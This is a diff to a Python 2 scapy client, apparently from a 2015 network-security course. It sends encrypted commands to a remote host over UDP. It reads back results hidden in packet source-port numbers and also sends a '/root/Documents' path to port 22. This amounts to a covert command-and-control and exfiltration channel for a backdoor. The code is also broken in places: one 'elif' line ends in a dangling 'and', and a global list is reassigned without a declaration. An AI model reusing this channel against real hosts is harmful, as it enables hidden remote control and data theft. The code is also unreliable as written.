@@ -12,11 +12,12 @@
 ##  DATE:           October 17, 2015
 ##
 ##################################################################################
-import sys, os, argparse, socket, logging
+import sys, os, argparse, socket, logging, threading
 from scapy.all import *
 from AesEncryption import *
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+sema1 = threading.BoundedSemaphore(value=1)
 message = []
 
 ##################################################################################
@@ -34,12 +35,40 @@ def stopfilter(pkt):
 
 	if ARP in pkt:
 		return False
-	if UDP in pkt and pkt['UDP'].sport != 128:
-		message.append(pkt['UDP'].sport)
-	if UDP in pkt and pkt['UDP'].sport == 128:
-		print decrypt(pkt['Raw'].load)
-		print message
-		return True
+
+	if UDP in pkt:
+
+		if pkt['UDP'].dport == 8000:
+
+			if pkt['UDP'].sport != 128:
+				message.append(pkt['UDP'].sport)
+				return False
+
+			if pkt['UDP'].sport == 128:
+				secret = ""
+				for m in message:
+					secret += chr(m)
+
+				print decrypt(secret)
+
+				secret = ""
+				message = []
+				sema1.release()
+				return True
+
+
+		elif pkt['UDP'].dport == 7000 and :
+			print pkt.show()
+			print (pkt['Raw'].load)
+			return True
+
+def sendCommandLoop(args):
+	while 1:
+		sema1.acquire()
+		payload = raw_input("New input: ")
+		pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=int(args.dstPort), sport=8000)/encrypt(payload)
+		send(pkt)
+
 
 ##################################################################################
 ##  FUNCTION
@@ -51,8 +80,7 @@ def stopfilter(pkt):
 ##					the server.
 ##################################################################################
 def main():
-	secret = ""
-	global message
+
 
 	cmdParser = argparse.ArgumentParser(description="8505A3-PortKnock Client")
 	cmdParser.add_argument('-d','--dstIp',dest='dstIp', help='Destination address of the host to send the message to.', required=True)
@@ -60,22 +88,18 @@ def main():
 	cmdParser.add_argument('-p','--dstPort',dest='dstPort', help='Destination port of the host to send the message to.', required=True)
 	args = cmdParser.parse_args();
 
-	pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=22, sport=8000)/("/root/Documents/")
+	pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=22, sport=8000)/("/root/Documents")
 	send(pkt)
 
+	t1 = threading.Thread(name="sendCommandLoop", target=sendCommandLoop, args=[args])
+	t1.start()
+
 	while 1:
-		payload = raw_input("Some input please: ")
-		pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=int(args.dstPort), sport=8000)/encrypt(payload)
-		send(pkt)
-		sniff(filter="udp and (dst port 8000 and src " + args.dstIp + ")", stop_filter=stopfilter)
+		sniff(filter="udp and (dst port 8000 or dst port 7000)", stop_filter=stopfilter)
 
-		for m in message:
-			secret += chr(m)
+	t1.join()
 
-		print decrypt(secret)
 
-		secret = ""
-		message = []
 
 if __name__ == '__main__':
 	main()
